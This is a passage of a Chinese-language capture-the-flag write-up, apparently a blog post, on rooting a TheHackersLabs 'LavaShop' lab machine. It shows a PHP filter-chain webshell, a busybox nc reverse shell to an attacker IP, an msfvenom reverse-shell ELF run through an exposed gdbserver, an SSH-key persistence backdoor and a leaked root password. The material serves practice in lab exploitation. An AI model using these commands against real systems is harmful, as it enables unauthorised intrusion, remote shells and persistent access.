
然后应该想到这里打phpfilterchain

超级nb的一个项目https://github.com/synacktiv/php_filter_chain_generator

```bash
python php_filter_chain_generator.py --chain '<?php phpinfo();?> '
```

发现完全可行

<img src="/assets/img/thehackerslabs-notes/image-20251109143701186.png" alt="image-20251109143701186" style="zoom:50%;" />

那么接下来就是写一句话木马了

```bash
python php_filter_chain_generator.py --chain '<?php system($_POST["cmd"]);?> '
```

<img src="/assets/img/thehackerslabs-notes/image-20251109144243100.png" alt="image-20251109144243100" style="zoom:50%;" />

接下来记录下弹shell

### get shell

```bash
cmd=busybox nc 10.161.137.197 4444 -e bash
```

kali那边可以连接成功

<img src="/assets/img/thehackerslabs-notes/image-20251109150606753.png" alt="image-20251109150606753" style="zoom:50%;" />

接下来呢，学习一下维持shell

```bash
/usr/bin/script -qc /bin/bash /dev/null
^z
stty raw -echo;fg
reset
xterm
```

<img src="/assets/img/thehackerslabs-notes/image-20251109151315564.png" alt="image-20251109151315564" style="zoom: 80%;" />

简单说说这里干了些什么

1. `script -qc /bin/bash /dev/null`

- `script`：记录终端会话的工具
- `-qc /bin/bash`：安静模式执行bash
- `/dev/null`：输出到空设备（不保存记录）
- **效果**：创建一个伪终端(pty)，获得更好的交互支持

2. `^z` (Ctrl+Z)

- 把当前作业挂起到后台
- 暂停`script`进程

3. `stty raw -echo; fg`

- `stty raw`：设置终端为原始模式（直接传递按键）
- `-echo`：关闭回显（避免重复字符）
- `fg`：把挂起的作业拉回前台
- **效果**：恢复作业并设置正确的终端模式

4. `reset`

- 重置终端设置
- 修复可能混乱的显示

5. `xterm`

- 设置TERM环境变量为xterm
- 确保终端类型正确识别

![image-20251109151629813](/assets/img/thehackerslabs-notes/image-20251109151629813.png)

### to root

看到这里的进程里面，用户Rodri启动了个gdbserver服务，应该可以在这里上手

```bash
www-data@Thehackerslabs-LavaShop:/$ ps aux | grep Rodri
Rodri        406  0.0  0.1  11476  3496 ?        Ss   06:15   0:00 /usr/bin/gdbserver --once 0.0.0.0:1337 /bin/true
Rodri        428  0.0  0.0    404     4 ?        t    06:15   0:00 /bin/true
www-data    1030  100  0.0   3212   292 pts/0    R+   08:16   0:00 grep Rodri
www-data@Thehackerslabs-LavaShop:/$ 

```

参考链接：[来自hacktricks](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbser#%E4%B8%8A%E4%BC%A0%E5%92%8C%E6%89%A7%E8%A1%8C)

我靠，这是真nb，kali端配置了nc -lvnp 4445

然后我本地先生成elf

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.161.137.197 LPORT=4445 PrependFork=true -f elf -o binary.elf
```

接下来就是pwndgbserver远程调试

```bash
(base) yolo@yolo:~/Desktop/tools$ gdb binary.elf
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 209 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)
------- tip of the day (disable with set show-tips off) -------
Want to NOP some instructions? Use patch <address> 'nop; nop; nop'
pwndbg> target extended-remote 10.161.145.95:1337
Remote debugging using 10.161.145.95:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /usr/lib/debug/.build-id/8a/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /lib64/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /lib64/.debug/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /usr/lib/debug//lib64/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /usr/lib/debug/lib64//6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
Reading /usr/lib/debug/.build-id/a7/52f6d1c0edab0671d291d55c36296a3c55f0c2.debug from remote target...
0x00007ffff7fe5a50 in ?? () from target:/lib64/ld-linux-x86-64.so.2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  0
 RBX  0
 RCX  0
 RDX  0
 RDI  0
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0
 RSP  0x7fffffffed00 ◂— 1
 RIP  0x7ffff7fe5a50 ◂— mov rdi, rsp
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
 ► 0x7ffff7fe5a50    mov    rdi, rsp     RDI => 0x7fffffffed00 ◂— 1
   0x7ffff7fe5a53    call   0x7ffff7fe6650              <0x7ffff7fe6650>

   0x7ffff7fe5a58    mov    r12, rax
   0x7ffff7fe5a5b    mov    rdx, qword ptr [rsp]
   0x7ffff7fe5a5f    mov    rsi, rdx
   0x7ffff7fe5a62    mov    r13, rsp
   0x7ffff7fe5a65    and    rsp, 0xfffffffffffffff0
   0x7ffff7fe5a69    mov    rdi, qword ptr [rip + 0x175b0]     RDI, [_rtld_global]
   0x7ffff7fe5a70    lea    rcx, [r13 + rdx*8 + 0x10]
   0x7ffff7fe5a75    lea    rdx, [r13 + 8]
   0x7ffff7fe5a79    xor    ebp, ebp                           EBP => 0
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffed00 ◂— 1
01:0008│     0x7fffffffed08 —▸ 0x7fffffffeee3 ◂— '/bin/true'
02:0010│     0x7fffffffed10 ◂— 0
03:0018│     0x7fffffffed18 —▸ 0x7fffffffeeed ◂— 'SHELL=/bin/bash'
04:0020│     0x7fffffffed20 —▸ 0x7fffffffeefd ◂— 'PWD=/home/Rodri'
05:0028│     0x7fffffffed28 —▸ 0x7fffffffef0d ◂— 'LOGNAME=Rodri'
06:0030│     0x7fffffffed30 —▸ 0x7fffffffef1b ◂— 'SYSTEMD_EXEC_PID=1068'
07:0038│     0x7fffffffed38 —▸ 0x7fffffffef31 ◂— 'HOME=/home/Rodri'
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0   0x7ffff7fe5a50 None
   1              0x1 None
   2   0x7fffffffeee3 None
   3              0x0 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> remote put binary.elf binary.elf
Successfully sent file "binary.elf".
pwndbg> set remote exec-file /home/Rodri/binary.elf
pwndbg> run
```

run了后，我们就在kali拿到用户Rodri的shell，接下来就像最上面那样维持下shell，不过这里有个新的路线，我们配置一个.ssh/authorized_keys，直接ssh远程连靶机，这样做的话，我们后续要是有文件上传等操作，直接scp上去就好了

> 温馨提示，这里生成ssh公钥的操作一定要在新的终端进行，不能直接退出pwndgb，否则Rodri的shell就维持失效了

```bash
# 攻击机
ssh-keygen -t rsa -b 4096 -f rodri_key
cat rodri_key.pub
# 靶机
mkdir -p /home/Rodri/.ssh
chmod 700 /home/Rodri/.ssh
echo "ssh-rsa...我们攻击机生成的rodri_key.pub" > /home/Rodri/.ssh/authorized_keys
chmod 600 /home/Rodri/.ssh/authorized_keys
chown -R Rodri:Rodri /home/Rodri/.ssh/
```

接下来退出pwndbg都没问题

```bash
(base) yolo@yolo:~/Desktop/tools$ ssh -i rodri_key Rodri@10.161.145.95
The authenticity of host '10.161.145.95 (10.161.145.95)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:31: [hashed name]
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.145.95' (ED25519) to the list of known hosts.
Linux Thehackerslabs-LavaShop 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Rodri@Thehackerslabs-LavaShop:~$
```

然后提root的话，进行了常见的suid文件，cron*日志等等，没找到合适的，然后在env里面看到了ROOT_PASS

```bash
Rodri@Thehackerslabs-LavaShop:~$ env
SHELL=/bin/bash
ROOT_PASS=lalocadelaslamparas
......
Rodri@Thehackerslabs-LavaShop:~$ su root
Contraseña:
root@Thehackerslabs-LavaShop:/home/Rodri# ls
binary.elf  linpeas.sh  user.txt
root@Thehackerslabs-LavaShop:/home/Rodri# cd
root@Thehackerslabs-LavaShop:~# ls
root.txt
root@Thehackerslabs-LavaShop:~# cat root.txt
60493ecb4b8037433e58499?????????
root@Thehackerslabs-LavaShop:~#
```

